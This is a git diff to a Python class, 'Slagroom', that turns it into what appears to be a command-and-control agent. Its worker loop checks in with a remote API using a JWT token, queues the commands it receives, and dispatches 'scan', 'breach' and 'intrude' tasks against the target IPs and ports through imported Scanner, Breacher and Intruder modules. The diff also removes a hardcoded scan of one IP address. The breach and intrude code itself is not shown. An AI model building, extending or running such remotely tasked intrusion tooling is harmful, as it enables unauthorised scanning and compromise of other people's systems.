@@ -9,13 +9,18 @@ Authors:
 import os
 import codecs
 import json
+import sys
 import threading
 import queue
 import time
 import uuid
+import datetime
+import asyncio
 
 from kers.apiClient import ApiClient
 from kers.scanner import Scanner
+from kers.breacher import Breacher
+from kers.intruder import Intruder
 
 
 class Slagroom:
@@ -56,11 +61,13 @@ class Slagroom:
         self._load_config()
         self._verify_config()
 
+        self._wait_time = 10
         self._apiClient = ApiClient(self._config["API_URL"], self._config["JWT_TOKEN"])
         self._scanner = Scanner()
+        self._breacher = Breacher()
+        self._intruder = Intruder()
+        self._task_queue = queue.Queue()
         self._task = None
-        self._scanner.scan_range(["45.33.32.156"], [443])
-
         self._thread = threading.Thread(target=self._worker, daemon=True)
 
     def _load_config(self) -> None:
@@ -81,13 +88,42 @@ class Slagroom:
         if 'API_URL' not in self._config.keys() or 'JWT_TOKEN' not in self._config.keys():
             raise ValueError(f"Config does not hold all expected keys: {['API_URL', 'JWT_TOKEN']}")
 
+    def _fill_queue(self) -> None:
+        tasks = self._apiClient.check_in()['commands']
+        for task in tasks:
+            self._task_queue.put(task)
+
     def _worker(self) -> None:
         while True:
-            if self._task is None:
-                return
-            else:
-                return
+            try:
+                if self._task_queue.qsize() == 0:
+                    print(f'[Slagroom] Filling queue')
+                    self._fill_queue()
+                    if self._task_queue.qsize() == 0:
+                        print(f'[Slagroom] No tasks at : {datetime.datetime.now()}')
+                        time.sleep(self._wait_time)
+                        continue
+                print("[Slagroom] Tasks in queue...!")
+                task = self._task_queue.get()
+                print(f"[Slagroom] Current task : {task}")
+                match task["command"]:
+                    case 'scan':
+                        print(f"[Slagroom] Scanning {task['ips']}")
+                        output = self._scanner.scan_range(task["ips"], task["ports"])
+                    case 'breach':
+                        print(f"[Slagroom] Breaching {task['ips']}")
+                        output = self._breacher.breach(task["ips"], task["ports"])
+                        print(f"[Slagroom] Output: {output}")
+                    case 'intrude':
+                        print(f"[Slagroom] Intruding {task['ip']}")
+                        output = self._intruder.intrude(task['ip'], task['port'], task['os'])
+                        print(f"[Slagroom] Output: {output}")
+                self._task_queue.task_done()
+                time.sleep(self._wait_time)
+            except KeyboardInterrupt:
+                sys.exit(0)
 
     def start(self) -> None:
-        # self._thread.start()
-        return
+        print("[Slagroom] Starting Slagroom...")
+        self._thread.start()
+        self._thread.join()
